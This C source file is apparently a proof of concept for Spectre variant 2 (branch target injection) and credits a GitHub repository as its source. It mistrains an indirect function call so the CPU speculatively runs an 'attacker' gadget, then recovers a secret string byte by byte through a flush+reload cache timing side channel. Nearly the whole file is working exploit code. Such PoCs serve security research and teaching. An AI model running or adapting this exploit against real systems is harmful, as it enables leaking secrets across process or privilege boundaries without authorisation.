//! source: https://github.com/Anton-Cao/spectrev2-poc/
#include <stdint.h>
#include <x86intrin.h>
#include <stdio.h>
#include <string.h>

#include "../sidechannel/flush_reload.h"


#define CACHE_MISS 80
#define PAGESIZE 4096
int (*fp1)(char *info);
int (**fp2)(char *info);
char *probe_buf;
int junk;

int attacker(char *info){
    return probe_buf[*info * PAGESIZE];
}

int safe(){
    return 42;
}

int victim(char *info, int input){
    static int result;
    for (int i =0; i < 100; i++){
        input += i;
        junk += input & i;
    }

    _mm_mfence(); // removing the fence breaks attack???
    result = (*fp2)(info);

    return result;
}

void main(){
    int i, j,k;
    char trash = '#';
    probe_buf = malloc(256 * PAGESIZE);
    int results[256];

    char* target = "zoo";
    int mix_i;

    memset(probe_buf, 1, 256*PAGESIZE);

    for (int p = 0; p < 3; p++){
        for (i = 0; i < 256; i++) {
            results[i] = 0;
        }
        for (int tries = 19; tries > 0; tries--){
            fp1 = &attacker;
            fp2 = &fp1;
            
            _mm_mfence();
            for (i = 0; i < 50; i++){
                junk ^= victim(&trash,0);
            }

            _mm_mfence();

            flush(probe_buf, PAGESIZE);

            _mm_mfence();
            fp1 = &safe;
            fp2 = &fp1;
            _mm_mfence();

            _mm_clflush((void*)fp1);
            _mm_clflush((void*)fp2);
            _mm_mfence();
            junk ^= victim(target + p,0);
            _mm_mfence();
            probe(probe_buf,80,PAGESIZE,results);

            _mm_mfence();
            // locate top two results
            j = k = -1;
            for (i = 0; i < 256; i++) {
                if (j < 0 || results[i] >= results[j]) {
                    k = j;
                    j = i;
                } else if (k < 0 || results[i] >= results[k]) {
                    k = i;
                }
            }
            if ((results[j] >= 2 * results[k] + 5) ||
                (results[j] == 2 && results[k] == 0)) {
                break;
            }
        }

        printf("j,results[j]: %c,%d\n",j,results[j]);
    }
    free(probe_buf);
}